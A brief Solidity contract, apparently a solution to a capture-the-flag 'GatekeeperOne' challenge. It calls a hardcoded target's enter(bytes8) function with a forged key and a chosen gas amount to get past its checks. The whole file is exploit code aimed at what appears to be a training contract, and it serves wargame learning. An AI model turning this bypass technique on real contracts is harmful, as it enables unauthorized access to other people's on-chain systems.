// SPDX-License-Identifier: MIT

pragma solidity 0.8.0;

contract EnterGateKeeper {
    address gateKeeperAddress = 0x6Ec9109f3ED94d54Ee998539854be06BC70a3bfD;

    bytes8 gateKey = 0x005e9ba00000fcdc;

    bytes public returnedData;

    function youShallPass(uint256 _gas) public {
        (bool success, bytes memory data) =
            gateKeeperAddress.call{gas: _gas}(abi.encodeWithSignature("enter(bytes8)", gateKey));
        if (!success) {
            returnedData = data;
        }
    }
}
